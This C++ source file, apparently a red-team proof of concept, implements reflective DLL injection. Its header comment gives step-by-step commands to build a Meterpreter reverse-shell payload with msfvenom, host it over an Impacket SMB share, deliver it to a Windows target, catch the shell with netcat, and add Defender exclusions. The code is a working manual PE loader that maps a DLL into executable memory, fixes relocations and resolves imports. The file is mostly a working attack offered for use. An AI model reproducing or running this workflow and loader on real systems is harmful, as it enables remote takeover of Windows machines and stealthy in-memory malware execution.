//lsecqt
/*
 * =============================================================
 *  REFLECTIVE DLL INJECTION POC — FULL WORKFLOW
 * =============================================================
 *
 *  SETUP (Once)
 *  ------------
 *  1. Attacker: Kali Linux (IP: 192.168.68.110)
 *  2. Target:   Windows 10/11 x64 VM (same network / bridged adapter)
 *  3. Ensure both machines can ping each other.
 *
 *  STEP 1 — GENERATE THE PAYLOAD SHELLCODE (Kali)
 *  -----------------------------------------------
 *  Use msfvenom to create a raw shellcode payload.
 *  This produces a raw binary (.bin) that can be loaded directly.
 *
 *    msfvenom -p windows/x64/meterpreter/reverse_tcp \
 *             LHOST=192.168.68.110 \
 *             LPORT=4444 \
 *             -f raw -o payload.bin
 *
 *  NOTE: msfvenom can also output directly to a DLL or EXE format:
 *    -f dll  → creates a Windows DLL payload
 *    -f exe  → creates a Windows EXE payload
 *  For THIS PoC we use -f raw to get raw shellcode bytes.
 *
 *  STEP 2 — CONVERT SHELLCODE TO C ARRAY (Optional)
 *  -------------------------------------------------
 *  If embedding the payload into the loader source:
 *    xxd -i payload.bin > payload_array.h
 *
 *  Or use ShadowBurn (PE-to-shellcode converter):
 *    python3 ~/source/ShadowBurn/ShadowBurn.py \
 *        -f shell.bin \
 *        -o test.dll \
 *        -dllFunc MyDllMain
 *
 *    ShadowBurn converts a PE file (DLL/EXE) into a position-
 *    independent shellcode blob.
 *
 *    Options:
 *      -f          Output file for shellcode (.bin)
 *      -o          Input PE file (.dll or .exe)
 *      -dllFunc    Exported function to execute (e.g., MyDllMain)
 *      --arch      Target architecture (x64 | x86)
 *      --service   Create a service binary
 *      -o          Output shellcode file
 *
 *  STEP 3 — HOST PAYLOAD VIA IMPACKET SMB SERVER (Kali)
 *  ----------------------------------------------------
 *  Install impacket if not present:
 *    pip install impacket
 *
 *  Start an SMB share to host the payload:
 *    impacket-smbserver share . -smb2support
 *
 *    Options:
 *      share           Share name (accessed as \\IP\share)
 *      .               Directory to serve (current dir)
 *      -smb2support    Enable SMB2/3 (required for modern Windows)
 *      -username       Require authentication
 *      -password       Password for auth
 *
 *  The share will be accessible at:
 *    \\192.168.68.110\share\
 *
 *  STEP 4 — START NETCAT LISTENER (Kali)
 *  -------------------------------------
 *  Wait for the reverse shell connection:
 *    nc -lvnp 4444
 *
 *    -l  Listen mode
 *    -v  Verbose
 *    -n  No DNS resolution
 *    -p  Port number
 *
 *  STEP 5 — DELIVER PAYLOAD TO TARGET (Windows)
 *  ---------------------------------------------
 *  On the Windows target, copy the payload from the SMB share:
 *
 *    copy \\192.168.68.110\share\payload.bin C:\Temp\payload.bin
 *
 *  Or map the share first:
 *    net use \\192.168.68.110\share /USER:user password
 *    copy \\192.168.68.110\share\payload.bin C:\Temp\payload.bin
 *
 *  STEP 6 — EXECUTE REFLECTIVE LOADER (Windows)
 *  ---------------------------------------------
 *  Run the reflective loader (refdll.exe) which will:
 *    1. Read payload.bin from disk (or C:\Temp\test.dll)
 *    2. Map it into memory (parse PE, copy sections, relocations)
 *    3. Resolve imports
 *    4. Execute the entry point / exported function
 *
 *    C:\Temp\refdll.exe
 *
 *  STEP 7 — CATCH THE REVERSE SHELL (Kali)
 *  ---------------------------------------
 *  The netcat listener on Kali should receive a connection:
 *
 *    listening on [any] 4444 ...
 *    connect to [192.168.68.110] from (UNKNOWN) [192.168.68.103] 49978
 *    Microsoft Windows [Version 10.0.19045.5854]
 *    (c) Microsoft Corporation. All rights reserved.
 *
 *    C:\Users\user\Desktop>
 *
 *  =============================================================
 *  QUICK REFERENCE — ALL COMMANDS
 *  =============================================================
 *
 *  [KALI]
 *  # Generate raw shellcode
 *  msfvenom -p windows/x64/meterpreter/reverse_tcp \
 *           LHOST=192.168.68.110 LPORT=4444 \
 *           -f raw -o payload.bin
 *
 *  # Convert PE to shellcode (if using ShadowBurn)
 *  python3 ~/source/ShadowBurn/ShadowBurn.py \
 *      -f shell.bin -o test.dll -dllFunc MyDllMain
 *
 *  # Host via SMB
 *  impacket-smbserver share . -smb2support
 *
 *  # Listen for reverse shell
 *  nc -lvnp 4444
 *
 *  [WINDOWS]
 *  # Copy payload from share
 *  copy \\192.168.68.110\share\payload.bin C:\Temp\
 *
 *  # Execute loader
 *  C:\Temp\refdll.exe
 *
 *  =============================================================
 *  NOTES
 *  =============================================================
 *  - Ensure both machines are on the same network.
 *  - Windows Defender may flag payloads — add exclusions in lab.
 *  - SMB (port 445) must be open on the Windows firewall.
 *  - For lab/educational purposes only.
 *  - The `-smb2support` flag is required for Windows 10/11.
 *  - If SMB fails, use HTTP instead: python3 -m http.server 8000
 */


#include <iostream>
#include <windows.h>

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type   : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);
typedef void (*MyDllMain)();

int main()
{
    // get this module's image base address
    PVOID imageBase = GetModuleHandleA(NULL);

    // load DLL into memory
    HANDLE dll = CreateFileA("C:\\Temp\\test.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
    DWORD64 dllSize = GetFileSize(dll, NULL);
    LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
    DWORD outSize = 0;
    ReadFile(dll, dllBytes, dllSize, &outSize, NULL);

    // get pointers to in-memory DLL headers
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
    SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

    // allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
    //LPVOID dllBase = VirtualAlloc((LPVOID)0x0000080191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // get delta between this module's image base and the DLL that was read into memory
    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

    // copy over DLL image headers to the newly allocated space for the DLL
    std::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

    // copy over DLL image sections to the newly allocated space for the DLL
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
        LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
        std::memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
        section++;
    }

    // perform image base relocations
    IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
    DWORD relocationsProcessed = 0;

    while (relocationsProcessed < relocations.Size)
    {
        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
        relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

        for (DWORD i = 0; i < relocationsCount; i++)
        {
            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
            if (relocationEntries[i].Type == 0)
            {
                continue;
            }

            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
            DWORD_PTR addressToPatch = 0;
            ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
            addressToPatch += deltaImageBase;
            std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
        }
    }

    // resolve import address table
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
    LPCSTR libraryName = "";
    HMODULE library = NULL;

    while (importDescriptor->Name != NULL)
    {
        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
        library = LoadLibraryA(libraryName);

        if (library)
        {
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData != NULL)
            {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }

    // execute the loaded DLL
    //DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    //(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

    /*

    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dllBase + exportDirRVA);

    DWORD* nameRVAs = (DWORD*)((BYTE*)dllBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)dllBase + exportDir->AddressOfNameOrdinals);
    DWORD* functionRVAs = (DWORD*)((BYTE*)dllBase + exportDir->AddressOfFunctions);

    const char* targetName = "MyDllMain";   // <- the name of the function you want
    MyDllMain targetFunc = NULL;

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* funcName = (const char*)dllBase + nameRVAs[i];
        if (lstrcmpA(funcName, targetName) == 0) {
            WORD ordinal = ordinals[i];
            DWORD funcRVA = functionRVAs[ordinal];
            targetFunc = (MyDllMain)((BYTE*)dllBase + funcRVA);
            break;
        }
    }

    if (targetFunc) {
        targetFunc();   // call it just like you did with DllMain
    }

    */

    CloseHandle(dll);
    HeapFree(GetProcessHeap(), 0, dllBytes);

    return 0;
}
